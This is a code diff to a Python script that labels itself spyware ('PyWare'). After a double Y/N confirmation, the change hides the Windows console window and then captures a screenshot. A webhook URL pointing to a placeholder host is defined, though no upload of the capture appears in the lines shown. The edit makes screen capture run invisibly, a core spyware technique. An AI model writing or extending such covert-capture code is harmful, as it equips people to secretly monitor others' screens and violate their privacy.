@@ -3,15 +3,16 @@ import os
 import requests
 import subprocess
 import pyautogui
+import ctypes
 
-screenshot = pyautogui.screenshot()
 Webhook_url = "https://example.com"
 print("--PyWare--")
 Run = input("This is SPYWARE are you sure you want to run? Y/N | ")
 if Run.upper() == "Y":
     Confirm = input("Are you POSITIVE you want to run this? Y/N | ")
     if Confirm.upper() == "Y":
-        print("Test")
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        screenshot = pyautogui.screenshot()
     elif Confirm.upper() == "N":
         os.system('cls')
         print("Closing program please wait...")
@@ -32,4 +33,3 @@ else:
     print("Closing program please wait...")
     time.sleep(3)
     print("")
-
